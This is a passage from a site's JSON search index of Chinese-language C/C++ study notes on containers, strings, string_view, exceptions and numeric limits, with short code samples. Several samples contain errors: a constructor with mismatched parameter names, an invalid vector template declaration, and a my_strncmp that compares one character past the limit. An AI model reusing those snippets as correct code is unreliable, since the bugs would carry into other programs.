matrix[i][j]);\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#string_view","title":"string_view","text":"<ul> <li>c++17</li> </ul> <p>\u907f\u514d\u4e86string\u7684\u590d\u5236 <pre><code>if(string_view{s.data() + pos, len} == \"abc\")\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#emplace_back-push_back","title":"emplace_back, push_back","text":"<p>c++ - emplace_back() vs push_back when inserting a pair into std::vector - Stack Overflow  <pre><code>vector&lt;pair&lt;int, int&gt;&gt; ans;\n\nans.push_back({prime, cnt});   //\u6b63\u786e\nans.emplace_back({prime, cnt}); //\u9519\u8bef\n</code></pre></p> <p>emplace\u88ab\u8bbe\u8ba1\u7528\u6765\u907f\u514d\u6784\u5efa\u4e34\u65f6\u53d8\u91cf\uff0c\u7136\u540e\u62f7\u8d1d\u590d\u5236\u3002\u63a5\u6536\u7684\u662f\u6784\u9020\u51fd\u6570\u53c2\u6570 <pre><code>template&lt; class... Args &gt;\nreference emplace_back( Args&amp;&amp;... args );\n</code></pre> \u56e0\u6b64\u6539\u6210\u8fd9\u6837\u662f\u6b63\u786e\u7684 <pre><code>ans.emplace_back(prime, cnt);\n\nans.emplace_back(make_pair(prime, cnt)) //\u8fd9\u6837\u5199\u867d\u7136\u7ed3\u679c\u6b63\u786e\uff0c\u4f46\u662femplace\u5c31\u6ca1\u6709\u610f\u4e49\u4e86\uff0c\u56e0\u4e3a\u5df2\u7ecf\u663e\u793a\u6784\u5efa\u4e86\u4e34\u65f6\u53d8\u91cf\n</code></pre></p> <p>\u53e6\u5916<code>{1, 2}</code>\u4e0d\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5177\u4f53\u542b\u4e49\u548c\u573a\u666f\u6709\u5173\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#emplace\u4e00\u4e2a\u590d\u6742\u5bf9\u8c61","title":"emplace\u4e00\u4e2a\u590d\u6742\u5bf9\u8c61","text":"<p>c++ - how to use std::vector::emplace_back for vector&lt;vector? - Stack Overflow</p> <p>\u89e3\u6cd5\u4e00\uff1a <pre><code>res.emplace_back(std::initializer_list&lt;int&gt;{1,2});\n</code></pre></p> <p>\u89e3\u6cd5\u4e8c\uff1a\u4f7f\u7528move <pre><code>for (int i = 0; i &lt; 10000; ++i) {\n    std::vector&lt;int&gt; v(10000, 0);  // will become empty afterward\n    res.emplace_back(std::move(v));  // can be replaced by \n                                     // res.push_back(std::move(v));\n}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u521d\u59cb\u5316pair-array","title":"\u521d\u59cb\u5316pair array","text":"<p>initialization - C++: array&lt;&gt; too many initializers - Stack Overflow <pre><code>array&lt;pair&lt;int, int&gt;, 8&gt; direction = {{{-1, -1}, {-1, 0}, {-1, 1}, {0, -1}, {0, 1}, {1, -1}, {1, 0}, {1, 1}}}; #\u9700\u8981\u591a\u4e00\u5c42{}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#c\u6709\u70b9\u70e6\u4eba\u7684\u5730\u65b9","title":"C\u6709\u70b9\u70e6\u4eba\u7684\u5730\u65b9","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362","title":"\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362","text":"<p>\u9690\u5f0f\u8f6c\u6362\u89c4\u5219 - \u6ce8\u610f\uff1aint -&gt; unsigned </p> <p><code>m*n</code>\u76f4\u63a5\u4e58\u4f1a\u6ea2\u51fa \u76f4\u63a5<code>min</code>\u53c8\u4f1a\u51fa\u73b0\u4e24\u8fb9\u53c2\u6570\u7c7b\u578b\u4e0d\u4e00\u6837\u7684\u95ee\u9898 <pre><code>int m = 99998, n = 99999;\nint k = 3;\nk = min((long long)k, (long long)m*n);\n</code></pre></p> <pre><code>unsigned int i = 3;\ncout &lt;&lt; i*-1 &lt;&lt;endl;   # -1\u88ab\u8f6c\u6362\u6210\ncout &lt;&lt; (int)i*-1 &lt;&lt;endl;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#struct\u521d\u59cb\u5316","title":"struct\u521d\u59cb\u5316","text":"<p>c\u4e2d\u9700\u8981<code>typedef struct aaa{} bbb;</code> - <code>struct aaa var</code>\u6216\u8005<code>bbb var;</code></p> <p>C++\u4e2d - \u53ef\u4ee5\u5b9a\u4e49\u6784\u9020\u51fd\u6570 - \u53ef\u4ee5\u76f4\u63a5\u521d\u59cb\u5316\u53d8\u91cf - struct aaa\u540e\u53ef\u4ee5\u76f4\u63a5aaa\u5b9a\u4e49\u53d8\u91cf</p> <p>\u5b9a\u4e49\u6784\u9020\u51fd\u6570\uff0cnew\u65f6\u901a\u8fc7\u5706\u62ec\u53f7\u5b9e\u4f8b\u5316 <pre><code>struct ListNode\n{\n    double value;\n    ListNode *next;\n    //\u6784\u9020\u51fd\u6570\n    ListNode(double valuel, ListNode *nextl = nullptr)\n    {\n        value = value1;\n        next = next1;\n    }\n};\n\nListNode *secondPtr = new ListNode(13.5);\nListNode *head = new ListNode(12.5, secondPtr);\n</code></pre></p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u82b1\u62ec\u53f7\u5b9e\u4f8b\u5316 <pre><code>head = new ListNode{v[0], nullptr};\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#c\u6807\u51c6\u5e93","title":"C++\u6807\u51c6\u5e93","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#stream","title":"stream","text":"<pre><code>#include &lt;sstream&gt;\n\nint val=123;\n\n// object from the class stringstream\nstringstream geek;\n\n// inserting integer val in geek stream\ngeek &lt;&lt; val;\n\n// The object has the value 123\n// and stream it to the string x\nstring x;\ngeek &gt;&gt; x;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5f02\u5e38\u5904\u7406","title":"\u5f02\u5e38\u5904\u7406","text":"<p>C++\u5f02\u5e38\u5904\u7406 - C++\u6559\u7a0b (yiibai.com) (41 \u5c01\u79c1\u4fe1 / 80 \u6761\u6d88\u606f) \u5982\u4f55\u7528C\u8bed\u8a00\u5b9e\u73b0\u5f02\u5e38/\u72b6\u51b5\u5904\u7406\u673a\u5236\uff1f - \u77e5\u4e4e (zhihu.com) Programming in Lua\uff08\u4e8c\uff09\uff0d \u5f02\u5e38\u4e0e\u9519\u8bef\u7801 | \u6280\u672f\u5947\u5f02\u70b9 (techsingular.net) C\u8bed\u8a00\u4e2d\u7684\u5f02\u5e38\u5904\u7406 - Sirk - \u535a\u5ba2\u56ed (cnblogs.com)</p> <p>\u81ea\u4ece C \u88ab\u53d1\u660e\u521d\u6765\uff0cC \u7a0b\u5e8f\u5458\u5c31\u4e60\u60ef\u4f7f\u7528\u9519\u8bef\u4ee3\u7801\uff0c\u4f46\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u901a\u8fc7\u8bbe\u7f6e\u4e00\u4e2a\u72b6\u6001\u53d8\u91cf\u6216\u8fd4\u56de\u9519\u8bef\u4ee3\u7801\u6765\u8868\u793a\u4e00\u4e2a\u5f02\u5e38\u72b6\u6001\uff0c\u6ca1\u6709\u529e\u6cd5\u4fdd\u8bc1\u51fd\u6570\u8c03\u7528\u8005\u5c06\u4e00\u5b9a\u68c0\u6d4b\u53d8\u91cf\u6216\u6d4b\u8bd5\u9519\u8bef\u4ee3\u7801\u3002\u7ed3\u679c\u7a0b\u5e8f\u4f1a\u4ece\u5b83\u9047\u5230\u7684\u5f02\u5e38\u72b6\u6001\u7ee7\u7eed\u8fd0\u884c\uff0c\u5f02\u5e38\u6ca1\u6709\u88ab\u6355\u83b7\uff0c\u7a0b\u5e8f\u7acb\u5373\u4f1a\u7ec8\u6b62\u6267\u884c\u3002\u7531</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u629b\u51fa\u5f02\u5e38","title":"\u629b\u51fa\u5f02\u5e38","text":"<p>throw\u8bed\u53e5\u51b3\u5b9a\u629b\u51fa\u5f02\u5e38\u7c7b\u578b <pre><code>double division(int a, int b)\n{\n   if( b == 0 )\n   {\n      throw \"Division by zero condition!\";\n   }\n   return (a/b);\n}\n</code></pre></p> <pre><code> try {\n   z = division(x, y);\n   cout &lt;&lt; z &lt;&lt; endl;\n }catch (const char* msg) {\n   cerr &lt;&lt; msg &lt;&lt; endl;\n }\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6355\u83b7\u5f02\u5e38","title":"\u6355\u83b7\u5f02\u5e38","text":"<ul> <li>\u6309\u60c5\u51b5\u6355\u83b7\u4e0d\u540c\u7c7b\u578b\u5f02\u5e38 <pre><code>try\n{\n   // protected code\n}catch( ExceptionName1 e1 )\n{\n   // catch block\n}catch( ExceptionName2 e2 )\n{\n   // catch block\n}\n</code></pre></li> </ul> <p><code>...</code>\u6355\u83b7\u4efb\u610f\u7c7b\u578b <pre><code>try {\n    x = stoi(s, &amp;pos);\n    if(pos!=len){\n        is_digit = false;\n    }\n} catch (...) {\n    is_digit = false;\n}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5f02\u5e38\u7c7b\u578b","title":"\u5f02\u5e38\u7c7b\u578b","text":"<p>\u5f02\u5e38\u53ef\u4ee5\u662f\u4efb\u610f\u7c7b\u578b\uff0c\u7531throw\u8bed\u53e5\u51b3\u5b9a c++<code>&lt;exception&gt;</code>\u5b9a\u4e49\u4e86\u6807\u51c6\u5f02\u5e38\u7c7b\u578b </p> <p>what()\u65b9\u6cd5\u8fd4\u56de\u5f02\u5e38\u539f\u56e0 <pre><code>std::cout &lt;&lt; e.what() &lt;&lt; std::endl;\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u6570","title":"\u5e38\u6570","text":"<p>https://cplusplus.com/reference/climits/ <pre><code>#include &lt;cstdio&gt;\n#include &lt;climits&gt;\nusing namespace std;\n\nint main(){\n    printf(\"SCHAR_MIN: %d\\n\", SCHAR_MIN);       // -128\n    printf(\"SCHAR_MAX: %d\\n\", SCHAR_MAX);       // 127\n    printf(\"UCHAR_MAX: %d\\n\", UCHAR_MAX);       // 255\n    printf(\"CHAR_MIN: %d\\n\", CHAR_MIN);         // -128\n    printf(\"CHAR_MAX: %d\\n\", CHAR_MAX);         // 127\n    printf(\"INT_MIN: %d\\n\", INT_MIN);           // -2147483648\n    printf(\"INT_MAX: %d\\n\", INT_MAX);           // 2147483647\n    printf(\"UINT_MAX: %u\\n\", UINT_MAX);         // 4294967295\n    printf(\"LONG_MIN: %ld\\n\", LONG_MIN);        // -9223372036854775808\n    printf(\"LONG_MAX: %ld\\n\", LONG_MAX);        // 9223372036854775807\n    printf(\"ULONG_MAX: %lu\\n\", ULONG_MAX);      // 18446744073709551615\n    printf(\"LLONG_MIN: %lld\\n\", LLONG_MIN);     // -9223372036854775808\n    printf(\"LLONG_MAX: %lld\\n\", LLONG_MAX);     // 9223372036854775807\n    printf(\"ULLONG_MAX: %llu\\n\", ULLONG_MAX);   // 18446744073709551615\n\n    printf(\"DECIMAL_DIG: %d\\n\", DECIMAL_DIG); //21\n\n    printf(\"FLT_MIN: %e\\n\", FLT_MIN);       // 1.175494e-38\n    printf(\"FLT_MAX: %e\\n\", FLT_MAX);       // 3.402823e+38\n    printf(\"DBL_MIN: %e\\n\", DBL_MIN);       // 2.225074e-308\n    printf(\"DBL_MAX: %e\\n\", DBL_MAX);       // 1.797693e+308\n    printf(\"LDBL_MIN: %Le\\n\", LDBL_MIN);    // 3.362103e-4932   //\u4f7f\u7528Lf format\n    printf(\"LDBL_MAX: %Le\\n\", LDBL_MAX);    // 1.189731e+4932\n\n    printf(\"sizeof(double))     : %ld\\n\", sizeof(double)); // 8\n    printf(\"sizeof(long double)): %ld\\n\", sizeof(long double)); // 16 (\u6709\u4e9b\u53ef\u80fd\u4e3a10)\n\n    printf(\"FLT_EPSILON: %e\\n\", FLT_EPSILON);   // 1.192093e-07\n    printf(\"DBL_EPSILON: %e\\n\", DBL_EPSILON);   // 2.220446e-16\n    return 0;\n}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5bb9\u5668","title":"\u5bb9\u5668","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#array","title":"array","text":"<p>\u8f6c\u6362\u6210C\u7684\u6570\u7ec4 <pre><code>void foo(int *p, int len) {  \n    return;  \n}  \n\nstd::array&lt;int, 4&gt; arr = {1,2,3,4};  \n\n// C \u98ce\u683c\u63a5\u53e3\u4f20\u53c2  \n// foo(arr, arr.size()); // \u975e\u6cd5, \u65e0\u6cd5\u9690\u5f0f\u8f6c\u6362  \nfoo(&amp;arr[0], arr.size());  \nfoo(arr.data(), arr.size());\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#vector","title":"vector","text":"<p>\u6784\u9020\u51fd\u6570 <pre><code>// default (1)  \nexplicit vector (const allocator_type&amp; alloc = allocator_type());\n// fill (2) \nexplicit vector (size_type n);\nvector (size_type n, const value_type&amp; val, const allocator_type&amp; alloc = allocator_type());\n// range (3)    \ntemplate &lt;class InputIterator&gt;  vector (InputIterator first, InputIterator last, const allocator_type&amp; alloc = allocator_type());\n// copy (4) \nvector (const vector&amp; x);vector (const vector&amp; x, const allocator_type&amp; alloc);\n// move (5) \nvector (vector&amp;&amp; x);vector (vector&amp;&amp; x, const allocator_type&amp; alloc);\n// initializer list (6) \nvector (initializer_list&lt;value_type&gt; il,       const allocator_type&amp; alloc = allocator_type());\n</code></pre></p> <p>initializer_list <pre><code># \u521d\u59cb\u5316\nvector&lt;int, vector&lt;int&gt;&gt; v(m, vector&lt;int&gt;(n, 0)); //mxn\u77e9\u9635\n\nvector&lt;int&gt; v = {1, 2, 3, 4};\n\nvector&lt;int&gt; v2(initializer_list&lt;int&gt;{1,2})\nvector&lt;int&gt; v2{1,2}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#erase--insert","title":"erase &amp; insert","text":"<p>erase - \u8fd4\u56de\u5220\u9664\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\u7684\u8fed\u4ee3\u5668 <pre><code>iterator erase (const_iterator position);\niterator erase (const_iterator first, const_iterator last);\n</code></pre></p> <p>insert - \u5728postion\u524d\u9762\u63d2\u5165 - \u8fd4\u56de\u7b2c\u4e00\u4e2a\u65b0\u63d2\u5165\u5143\u7d20\u7684\u8fed\u4ee3\u5668 <pre><code>iterator insert (const_iterator position, const value_type&amp; val);\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#string","title":"string","text":"<p>\u6784\u9020\u51fd\u6570\uff0c\u5e38\u7528 - fill\uff1an, char - c-str\uff1a\u4ee50\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32 - buffer\uff1abuf + len - substring <pre><code>// default (1)   \nstring();\n// copy (2) \nstring (const string&amp; str);\n// substring (3)    \nstring (const string&amp; str, size_t pos, size_t len = npos);\n// from c-string (4)    \nstring (const char* s);\n// from buffer (5)  \nstring (const char* s, size_t n);\n// fill (6) \nstring (size_t n, char c);\n// range (7)    \ntemplate &lt;class InputIterator&gt;  string  (InputIterator first, InputIterator last);\n// initializer list (8) \nstring (initializer_list&lt;char&gt; il);\n// move (9) \nstring (string&amp;&amp; str) noexcept;\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u63d2\u5165\u5220\u9664","title":"\u63d2\u5165\u5220\u9664","text":"<p>\u63d2\u5165</p> <p>string\u7279\u6709\u65b9\u5f0f\uff1a\u4e0b\u6807 - \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3apos\uff0c\u5728pos\u5de6\u4fa7\u63d2\u5165   - 0&lt;= pos &lt;= n\uff0cn+1\u4e2a\u63d2\u5165\u4f4d\u7f6e - \u7b2c\u4e8c\u4e2a\u53c2\u6570\u7c7b\u4f3c\u4e8e\u6784\u9020\u51fd\u6570\u5404\u79cd\u5b57\u7b26\u4e32\u7c7b\u578b <pre><code>string&amp; insert (size_t pos, const string&amp; str);\n</code></pre></p> <p>\u6807\u51c6\u8fed\u4ee3\u5668\u65b9\u5f0f - \u5220\u9664\u5355\u4e2a\u8fed\u4ee3\u5668\u5bf9\u5e94\u5143\u7d20\uff0c\u6216\u8005\u4f7f\u7528\u8f93\u5165\u8fed\u4ee3\u5668\u6307\u5b9a\u4e00\u4e2arange - \u8fd4\u56de\u66f4\u65b0\u540e\u7684\u8fed\u4ee3\u5668 <pre><code>iterator insert (const_iterator p, char c);\ntemplate &lt;class InputIterator&gt;iterator insert (iterator p, InputIterator first, InputIterator last);\n</code></pre></p> <p>\u5220\u9664 - string\u7279\u6709\u65b9\u5f0f\uff1a\u5220\u9664\u5b50\u4e32 <pre><code>string&amp; erase (size_t pos = 0, size_t len = npos);\n</code></pre></p> <ul> <li>\u6807\u51c6\u8fed\u4ee3\u5668\u65b9\u5f0f <pre><code>iterator erase (const_iterator p);\niterator erase (const_iterator first, const_iterator last);\n</code></pre></li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u67e5\u627e","title":"\u67e5\u627e","text":"<p>\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u7d22\u5f15 <pre><code>string (1)  \nsize_t find (const string&amp; str, size_t pos = 0) const noexcept;\nc-string (2)    \nsize_t find (const char* s, size_t pos = 0) const;\nbuffer (3)  \nsize_t find (const char* s, size_t pos, size_type n) const;\ncharacter (4)   \nsize_t find (char c, size_t pos = 0) const noexcept;\n</code></pre></p> <p>\u6ca1\u627e\u5230\u8fd4\u56denpos <pre><code>static const size_t npos = -1;\n</code></pre></p> <p>This value, when used as the value for a\u00a0len\u00a0(or\u00a0sublen) parameter in\u00a0string's member functions, means\u00a0\"until the end of the string\".  As a return value, it is usually used to indicate no matches.</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u62fc\u63a5","title":"\u62fc\u63a5","text":"<ul> <li>\u62fc\u63a5\u662f\u5728\u539f\u672c\u5b57\u7b26\u4e32\u4e0a\u4fee\u6539\uff0c\u5982\u679c\u4e0d\u9700\u8981\u6539\u53d8\u6e90\u5b57\u7b26\u4e32\u4f7f\u7528 <code>+</code></li> <li>append\u5355\u4e2a\u5b57\u7b26\uff1a<code>digits.append(1, 'x');</code> <pre><code>// string (1)   \nstring&amp; append (const string&amp; str);\n// substring (2)    \nstring&amp; append (const string&amp; str, size_t subpos, size_t sublen);\n// c-string (3) \nstring&amp; append (const char* s);\n// buffer (4)   \nstring&amp; append (const char* s, size_t n);\n// fill (5) \nstring&amp; append (size_t n, char c);\n// range (6)    \ntemplate &lt;class InputIterator&gt;   string&amp; append (InputIterator first, InputIterator last);\n// initializer list(7)  \nstring&amp; append (initializer_list&lt;char&gt; il);\n</code></pre></li> </ul> <pre><code>//range\ntemplate &lt;class InputIterator&gt;  string  (InputIterator first, InputIterator last);\n//initializer list\nstring (initializer_list&lt;char&gt; il);\n\nsize() &lt;=&gt; length()\n</code></pre> <p>\u8f6c\u6362\u4e3aC string\uff0c\u6ce8\u610f\u8fd4\u56de\u503c\u662fconst <pre><code>const char* c_str() const noexcept;\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u66ff\u6362","title":"\u66ff\u6362","text":"<ul> <li>string: <code>string&amp; replace (size_t pos,        size_t len,        const string&amp; str);</code></li> <li>substring</li> <li>c-string</li> <li>buffer(char* s , size_t n)</li> <li>fill: <code>string&amp; replace (size_t pos,        size_t len,        size_t n, char c);</code> <pre><code>// replacing in a string\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nint main ()\n{\n  std::string base=\"this is a test string.\";\n  std::string str2=\"n example\";\n  std::string str3=\"sample phrase\";\n  std::string str4=\"useful.\";\n\n  // replace signatures used in the same order as described above:\n\n  // Using positions:                 0123456789*123456789*12345\n  std::string str=base;           // \"this is a test string.\"\n  str.replace(9,5,str2);          // \"this is an example string.\" (1)\n  str.replace(19,6,str3,7,6);     // \"this is an example phrase.\" (2)\n  str.replace(8,10,\"just a\");     // \"this is just a phrase.\"     (3)\n  str.replace(8,6,\"a shorty\",7);  // \"this is a short phrase.\"    (4)\n  str.replace(22,1,3,'!');        // \"this is a short phrase!!!\"  (5)\n\n  // Using iterators:                                               0123456789*123456789*\n  str.replace(str.begin(),str.end()-3,str3);                    // \"sample phrase!!!\"      (1)\n  str.replace(str.begin(),str.begin()+6,\"replace\");             // \"replace phrase!!!\"     (3)\n  str.replace(str.begin()+8,str.begin()+14,\"is coolness\",7);    // \"replace is cool!!!\"    (4)\n  str.replace(str.begin()+12,str.end()-4,4,'o');                // \"replace is cooool!!!\"  (5)\n  str.replace(str.begin()+11,str.end(),str4.begin(),str4.end());// \"replace is useful.\"    (6)\n  std::cout &lt;&lt; str &lt;&lt; '\\n';\n  return 0;\n}\n</code></pre></li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b50\u4e32","title":"\u5b50\u4e32","text":"<ul> <li>\u6ce8\u610f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u957f\u5ea6 <pre><code>string substr (size_t pos = 0, size_t len = npos) const;\n</code></pre></li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u8f6c\u6362","title":"\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u8f6c\u6362","text":"<p>C++\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u8f6c\u6362\u5b8c\u5168\u653b\u7565 (biancheng.net) - \u4f7f\u7528\u5b57\u7b26\u4e32\u6d41\u5bf9\u8c61 - \u4f7f\u7528stoX, to_string</p> <p>stoX - pos\u8fd4\u56de\u7b2c\u4e00\u4e2a\u8f6c\u6362\u5931\u8d25\u7684\u4f4d\u7f6e\uff0c\u5982<code>stoi(\"-34iseven\", &amp;pos)</code>\uff0cpos\u4e3a3 - \u629b\u51fa\u5f02\u5e38invalid_argument <pre><code>string to_string(int value)  \nstring to_string(long value)  \nstring to_string(double value)\n\nint stoi(const strings str, size_t* pos = 0, int base = 10)  \nlong stol(const strings str, size_t* pos = 0, int base = 10)  \nfloat stof(const strings str, size_t* pos = 0)  \ndouble stod(const strings str, size_t* pos = 0)\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#string_viewc17","title":"string_view(c++17)","text":"<p>\u4f1a\u53d1\u73b0c++ string\u662fbasic_string\u6a21\u677f\u7c7b\u7684\u5b9e\u4f8b\u3002string_view\u5219\u662fbasic_string_view\u7684\u5b9e\u4f8b\u3002 <pre><code>typedef std::__cxx11::basic_string&lt;char&gt; std::string\nusing std::string_view = std::basic_string_view&lt;char&gt;\n</code></pre></p> <p>string_view\u63cf\u8ff0\u4e86\u4e00\u4e2a\u5e38\u91cf\u7684\u3001\u8fde\u7eed\u7684charT\u5e8f\u5217(constant contiguous sequence of\u00a0<code>CharT</code>)\uff0c\u4e0b\u6807\u4ece0\u5f00\u59cb\u3002 - \u53ef\u4ee5\u770b\u4f5c\u4e00\u4e2a\u5305\u542bconst\u6307\u9488\u548csize\u7684\u7ed3\u6784\u4f53\u3002 - \u901a\u8fc7<code>data()</code>\u83b7\u5f97const_pointer\uff08<code>const char *</code>)</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6784\u9020\u51fd\u6570","title":"\u6784\u9020\u51fd\u6570","text":"<pre><code>constexpr basic_string_view( const basic_string_view&amp; other ) noexcept\n    = default;\nconstexpr basic_string_view( const CharT* s );  # \u4e0d\u5305\u542b\u7ed3\u5c3enull\u5b57\u7b26\nconstexpr basic_string_view( const CharT* s, size_type count );  #\u524dcount\u4e2a\u5b57\u7b26\uff0c\u53ef\u80fd\u5305\u542bnull\n\nconst char* one_0_two = \"One\\0Two\";\nstd::string_view one_two_v{one_0_two, 7}; //size = 7\nstd::string_view one_v{one_0_two}; //size = 3\n\n//\u867d\u7136\u6ca1\u6709string\u7684\u6784\u9020\u51fd\u6570\uff0c\u4f46\u662fstring\u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3astring_view\n  std::string cppstr = \"Foo\";\n    std::string_view cppstr_v(cppstr); // overload (2), after\n                                       // std::string::operator string_view\n</code></pre> <p>operator<code>\"\" sv</code> Constructs a\u00a0<code>string_view</code>\u00a0from a string literal. Requires namespace\u00a0<code>std::literals::string_view_literals</code>. <pre><code>using namespace std;\nusing namespace literals::string_view_literals;\nstring_view sv{ \"Hello\"sv };\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5176\u5b83\u51fd\u6570","title":"\u5176\u5b83\u51fd\u6570","text":"<p>\u6bd4\u8f83\u51fd\u6570 <pre><code>template&lt; class CharT, class Traits &gt;\nconstexpr bool operator==( std::basic_string_view&lt;CharT,Traits&gt; lhs,\n                           std::basic_string_view&lt;CharT,Traits&gt; rhs ) noexcept;\n</code></pre></p> <p>\u8fd8\u53ef\u4ee5\u83b7\u5f97\u5b50string_view <pre><code>constexpr basic_string_view substr( size_type pos = 0,\n                                    size_type count = npos ) const;\n</code></pre></p> <p>find\u8fd4\u56deoffset <pre><code>constexpr\u00a0size_type find(\u00a0basic_string_view v, size_type pos\u00a0=\u00a00\u00a0)\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6ce8\u610f\u4e8b\u9879","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>c++ - How to efficiently get a <code>string_view</code> for a substring of <code>std::string</code> - Stack Overflow \u51fd\u6570\u4e0d\u5e94\u8be5\u8fd4\u56destring_view\u3002The consensus of advice from this group is that\u00a0<code>std::string_view</code>\u00a0must never be returned from a function, which means that my first offering above is bad form.</p> <p>As a result,\u00a0<code>std::string_view</code>\u00a0should be used with the utmost care, because from a memory management point of view it is equivalent to a copyable pointer pointing into the state of another object, which may no longer exist. However, it looks and behaves in all other respects like a value type.</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#string\u6bd4\u8f83\u907f\u514d\u590d\u5236","title":"string\u6bd4\u8f83\u907f\u514d\u590d\u5236","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#c-\u5b57\u7b26\u4e32\u6bd4\u8f83","title":"C \u5b57\u7b26\u4e32\u6bd4\u8f83","text":"<p><pre><code>int strcmp (const char* str1, const char* str2);\nint strncmp(const char *str1, const char *str2, size_t n)\n</code></pre> strncmp: This function starts comparing the first character of each string. If they are equal to each other, it continues with the following pairs until the characters differ, until a terminating null-character is reached, or until\u00a0num\u00a0characters match in both strings, whichever happens first. - \u6ce8\u610f\u662f<code>const char*</code>\uff0c\u5426\u5219\u4f20\u5165<code>string.c_str()</code>\u65f6\u4f1a\u62a5\u9519</p> <pre><code>int my_strcmp(const char *p1, const char *p2) {\n    while (*p1 &amp;&amp; *p2) {\n        if (*p1 != *p2) {\n            return *p1 - *p2;\n        }\n        p1++;\n        p2++;\n    }\n    return *p1 - *p2;\n}\nint my_strncmp(const char *p1, const char *p2, int n) {\n    while (*p1 &amp;&amp; *p2 &amp;&amp; n) {\n        if (*p1 != *p2) {\n            return *p1 - *p2;\n        }\n        p1++;\n        p2++;\n        n--;\n    }\n    return *p1 - *p2;\n}\n\nmy_strcmp(s1.c_str(), 